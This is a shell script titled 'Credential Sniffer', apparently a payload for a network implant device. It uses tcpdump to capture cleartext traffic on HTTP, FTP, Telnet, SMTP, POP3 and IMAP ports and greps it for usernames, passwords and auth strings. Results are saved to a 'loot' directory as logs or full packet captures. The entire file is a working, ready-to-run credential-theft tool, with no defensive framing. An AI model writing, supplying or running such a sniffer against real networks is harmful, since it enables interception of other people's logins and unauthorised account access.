#!/bin/sh
# Title: Credential Sniffer
# Author: NullSec
# Description: Passive credential sniffing using tcpdump
# Category: Network Reconnaissance

LOOT_DIR="/mmc/nullsec/creds"
mkdir -p "$LOOT_DIR"

echo "🔍 CREDENTIAL SNIFFER"
echo "━━━━━━━━━━━━━━━━━━━━━"

# Find available interface
IFACE=""
for i in br-lan eth0 wlan0; do
    [ -d "/sys/class/net/$i" ] && IFACE=$i && break
done
[ -z "$IFACE" ] && { echo "[!] No interface found!"; exit 1; }

echo "[*] Using interface: $IFACE"
echo ""
echo "Sniffing modes:"
echo "1) HTTP credentials (forms, basic auth)"
echo "2) FTP credentials"
echo "3) Telnet/SSH banners"
echo "4) All cleartext passwords"
echo "5) Full packet capture"
echo ""
echo -n "Choice [4]: "
read MODE
MODE=${MODE:-4}

echo -n "Duration in seconds [120]: "
read DURATION
DURATION=${DURATION:-120}

TIMESTAMP=$(date +%Y%m%d_%H%M)
LOG_FILE="$LOOT_DIR/sniff_$TIMESTAMP.log"
PCAP_FILE="$LOOT_DIR/capture_$TIMESTAMP.pcap"

echo ""
echo "[*] Starting capture on $IFACE..."
echo "Credential Sniffer Log - $(date)" > "$LOG_FILE"

case "$MODE" in
    1)
        # HTTP creds
        echo "[*] Capturing HTTP credentials..."
        timeout $DURATION tcpdump -i "$IFACE" -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' 2>/dev/null | \
            grep -iE 'user|pass|login|email|pwd|credential|auth' | tee -a "$LOG_FILE" &
        ;;
    2)
        # FTP creds  
        echo "[*] Capturing FTP credentials..."
        timeout $DURATION tcpdump -i "$IFACE" -A -s 0 'tcp port 21' 2>/dev/null | \
            grep -iE '^USER|^PASS' | tee -a "$LOG_FILE" &
        ;;
    3)
        # SSH/Telnet banners
        echo "[*] Capturing SSH/Telnet traffic..."
        timeout $DURATION tcpdump -i "$IFACE" -A -s 0 'tcp port 22 or tcp port 23' 2>/dev/null | \
            tee -a "$LOG_FILE" &
        ;;
    4)
        # All cleartext
        echo "[*] Capturing all cleartext credentials..."
        timeout $DURATION tcpdump -i "$IFACE" -A -s 0 \
            'tcp port 21 or tcp port 23 or tcp port 25 or tcp port 80 or tcp port 110 or tcp port 143 or tcp port 587' 2>/dev/null | \
            grep -iE 'user|pass|login|email|pwd|auth|credential' | tee -a "$LOG_FILE" &
        ;;
    5)
        # Full capture
        echo "[*] Full packet capture..."
        timeout $DURATION tcpdump -i "$IFACE" -w "$PCAP_FILE" -s 0 2>/dev/null &
        echo "[+] Saving to: $PCAP_FILE"
        ;;
esac

TCPDUMP_PID=$!
echo "[+] Capture running (PID: $TCPDUMP_PID)"
echo "[*] Duration: ${DURATION}s"
echo "[*] Press Ctrl+C to stop early"
echo ""

# Show live stats
wait $TCPDUMP_PID

# Parse results
CRED_COUNT=0
if [ -f "$LOG_FILE" ]; then
    CRED_COUNT=$(wc -l < "$LOG_FILE" | tr -d ' ')
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 SNIFFING COMPLETE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Duration: ${DURATION}s"
echo "Potential credentials: $CRED_COUNT lines"
echo "Log: $LOG_FILE"
[ -f "$PCAP_FILE" ] && echo "PCAP: $PCAP_FILE"

if [ "$CRED_COUNT" -gt 0 ] && [ "$CRED_COUNT" -lt 50 ]; then
    echo ""
    echo "=== Captured Data ==="
    cat "$LOG_FILE"
fi
